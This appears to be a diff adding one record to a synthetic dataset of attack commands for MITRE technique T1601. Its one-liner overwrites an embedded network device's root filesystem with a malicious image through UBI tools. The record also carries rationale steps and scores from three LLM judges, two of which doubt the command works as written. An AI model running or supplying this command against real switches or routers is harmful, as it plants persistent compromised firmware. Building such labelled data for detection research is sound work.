@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: update UBI rootfs volume'; ubiattach -m 5 >/dev/null && ubiupdatevol /dev/ubi0_0 /tmp/mal_rootfs.squashfs && ubidetach -m 5 && sync",
+  "explanation": "Attaches the UBI device and updates the rootfs volume with a malicious image in-place, altering the persisted operating system contents.",
+  "rationale_steps": [
+    "Attach the UBI device mapped to the rootfs MTD partition (typical on embedded switches/routers).",
+    "Use ubiupdatevol to replace the rootfs volume contents with a crafted image.",
+    "Detach and sync to finalize the on-flash modification."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-775c846e",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (;, &&), valid flags for ubiattach/ubidetach, correct redirection (>/dev/null), and balanced quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by using UBI tools to attach a UBI device, replace the root filesystem with a malicious image, detach the device, and sync changes - a realistic method to modify firmware on network devices.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:37:45.136534Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quotes, valid flags, and proper use of command separators (`;` and `&&`).",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly employs appropriate UBI tools (`ubiattach`, `ubiupdatevol`, `ubidetach`) and a logical sequence to update a rootfs volume, aligning well with the T1601 technique, the specified 'Privilege: None' makes the core UBI operations functionally impossible, preventing the achievement of the claimed intent in practice.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:38:14.194835Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Shell syntax is well-formed with balanced quotes, proper separators, and valid-looking flags and redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "It uses appropriate UBI tools to modify a rootfs volume aligning with system image tampering, but omits the UBI control device, assumes device numbering, and requires root privileges, making it unlikely to work as-is.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T17:38:16.450893Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
